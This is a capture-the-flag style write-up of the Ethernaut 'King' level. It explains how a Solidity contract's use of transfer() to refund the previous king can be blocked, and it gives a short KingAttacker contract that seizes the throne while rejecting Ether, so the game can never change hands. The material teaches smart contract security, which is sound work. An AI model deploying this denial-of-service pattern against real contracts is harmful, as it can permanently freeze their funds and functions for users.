---
layout: writeup
title: "King"
level: "Intermediate"
category: "Ethernaut"
description: "Claim the throne and remain King forever by creating a contract that refuses to accept Ether."
---

## Analysis

The `King` contract works like a game: to become the new king, you must send more Ether than the current "prize." When someone does this, the contract sends the previous prize back to the old king:
`payable(king).transfer(msg.value);`

**The Flaw:**
The contract uses `transfer()` to send funds to the previous king. In Solidity, `transfer()` has a fixed gas limit and **throws an error** if the recipient's code execution fails or if the recipient is a contract that cannot receive Ether.



If the current King is a contract that **does not have a receive() or fallback() function**, the `transfer()` call will always fail and revert. This prevents anyone else from ever becoming the new King, as the transaction will always roll back.

---

## Solution

You must deploy an "Indestructible King" contract that becomes the king but lacks any logic to accept incoming Ether.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    constructor() {}

    function attack(address payable _target) public payable {
        // Send enough ether to become the king
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // By NOT including a receive() or fallback() function, 
    // this contract will reject any plain Ether transfers.
}
</code></pre>

---